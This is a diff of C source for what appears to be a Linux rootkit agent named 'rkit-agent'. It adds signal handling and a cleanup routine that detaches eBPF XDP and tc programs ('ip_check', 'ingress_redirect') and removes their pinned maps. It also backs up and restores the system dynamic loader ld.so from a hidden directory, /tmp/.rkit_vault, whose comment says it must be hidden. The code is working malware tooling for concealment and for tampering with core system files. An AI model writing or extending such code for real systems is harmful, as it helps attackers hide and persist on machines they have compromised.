@@ -10,9 +10,43 @@
 #include <openssl/bio.h>
 #include <openssl/buffer.h>
 #include <openssl/evp.h>
+#include <signal.h>
+
 
 #define PORT 2333
 #define WS_GUID "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
+
+#define HIDDEN_DIR "/tmp/.rkit_vault" // this directory must be hide with step_1 codes
+
+
+// Cleanup: restore eBPF and ld.so changes
+void cleanup_and_restore() {
+    // Unload all loaded BPF programs and remove pinned maps
+    system("sudo bpftool net detach xdp dev enp0s3 > /dev/null 2>&1");
+    system("sudo tc qdisc del dev enp0s3 clsact > /dev/null 2>&1");
+    system("rm -f /sys/fs/bpf/ip_check /sys/fs/bpf/ingress_redirect /sys/fs/bpf/ingress__rodata /sys/fs/bpf/egress_restore /sys/fs/bpf/egress_r_rodata ");
+    system("rm -f /sys/fs/bpf/flow_map /sys/fs/bpf/filter_map");
+
+    // Restore ld.so if backup exists
+    char orig_ldso[256], backup_ldso[256];
+    snprintf(orig_ldso, sizeof(orig_ldso), "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
+    snprintf(backup_ldso, sizeof(backup_ldso), "%s/ld.so.bak", HIDDEN_DIR);
+    struct stat st;
+    if (stat(backup_ldso, &st) == 0) {
+        // Restore backup
+        rename(backup_ldso, orig_ldso);
+        unlink(backup_ldso);
+    }
+    // Remove our agent binary and hidden directory (if empty)
+    unlink("./.output/rkit-agent");
+    // Optionally remove hidden dir if empty (ignoring errors)
+    rmdir(HIDDEN_DIR);
+}
+
+void sig_handler(int signo) {
+    cleanup_and_restore();
+    exit(0);
+}
 
 // Helper: base64 encode
 char *base64_encode(const unsigned char *input, int length) {
@@ -44,16 +78,37 @@ int extract_ws_key(const char *buf, char *key, size_t keylen) {
     key[i] = 0;
     return 1;
 }
-#define HIDDEN_DIR "/tmp/.rkit_vault" // this directory must be hide with step_1 codes
 
 void setup_environment() { // creating the hiiden_dir if its not exist
     struct stat st = {0};
     if (stat(HIDDEN_DIR, &st) == -1) {
         mkdir(HIDDEN_DIR, 0777);
     }
+
+    // Backup ld.so if not already backed up
+    char orig_ldso[256], backup_ldso[256];
+    snprintf(orig_ldso, sizeof(orig_ldso), "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
+    snprintf(backup_ldso, sizeof(backup_ldso), "%s/ld.so.bak", HIDDEN_DIR);
+    if (stat(backup_ldso, &st) != 0) {
+        int src = open(orig_ldso, O_RDONLY);
+        int dst = open(backup_ldso, O_WRONLY | O_CREAT | O_TRUNC, 0700);
+        if (src >= 0 && dst >= 0) {
+            char buf[4096];
+            ssize_t n;
+            while ((n = read(src, buf, sizeof(buf))) > 0) {
+                write(dst, buf, n);
+            }
+        }
+        if (src >= 0) close(src);
+        if (dst >= 0) close(dst);
+    }
 }
 
 int main() {
+    // Register signal handlers
+    signal(SIGTERM, sig_handler);
+    signal(SIGINT, sig_handler);
+
     int server_fd, new_socket;
     struct sockaddr_in address;
     int opt = 1;
